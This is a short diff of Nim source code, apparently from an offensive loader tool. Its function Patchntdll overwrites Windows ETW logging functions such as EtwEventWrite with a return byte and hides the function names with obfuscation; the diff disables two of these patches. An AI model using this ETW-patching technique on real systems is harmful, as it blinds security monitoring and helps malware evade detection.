@@ -105,7 +105,8 @@ proc Patchntdll(): bool =
         op: ULONG
         t: ULONG
         disabled: bool = false
-        PatchAPIs: seq[string] = @[obf("EtwNotificationRegister"), obf("EtwEventRegister"), obf("EtwEventWriteFull"), obf("EtwEventWrite")]
+        # two of the functions cause problems for --csharp and --syswhispers --jump at the moment
+        PatchAPIs: seq[string] = @[#[obf("EtwNotificationRegister"),]# #[obf("EtwEventRegister"),]# obf("EtwEventWriteFull"), obf("EtwEventWrite")]
 
     when defined amd64:
         let patch: array[1, byte] = [byte 0xc3]
